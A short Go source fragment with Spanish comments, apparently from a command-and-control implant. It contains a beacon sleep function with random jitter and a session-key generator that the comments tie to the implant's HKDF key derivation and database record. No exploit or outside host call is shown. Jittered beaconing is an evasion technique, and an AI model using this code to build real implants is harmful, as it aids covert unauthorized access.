func sleepWithJitter() {
	if jitterPerc <= 0 {
		debugLog("sleep: %ds (sin jitter)", sleepSecs)
		time.Sleep(time.Duration(sleepSecs) * time.Second)
		return
	}
	jitter := big.NewInt(int64(sleepSecs * jitterPerc / 100))
	if jitter.Sign() <= 0 {
		debugLog("sleep: %ds (jitter 0)", sleepSecs)
		time.Sleep(time.Duration(sleepSecs) * time.Second)
		return
	}
	n, _ := rand.Int(rand.Reader, jitter)
	sleep := time.Duration(sleepSecs)*time.Second + time.Duration(n.Int64())*time.Second
	debugLog("sleep: %s (base %ds + jitter)", sleep, sleepSecs)
	time.Sleep(sleep)
}

// randomSessionKey genera un identificador corto (12 chars base36 ≈ 62 bits)
// que se usa como contexto HKDF en la derivación de claves y como
// session_key del implante en la DB.
func randomSessionKey() string {
	b := make([]byte, 12)
	rand.Read(b)
	const charset = "abcdefghijklmnopqrstuvwxyz0123456789"
	out := make([]byte, len(b))
	for i, v := range b {
		out[i] = charset[int(v)%len(charset)]
	}
	return string(out)
}

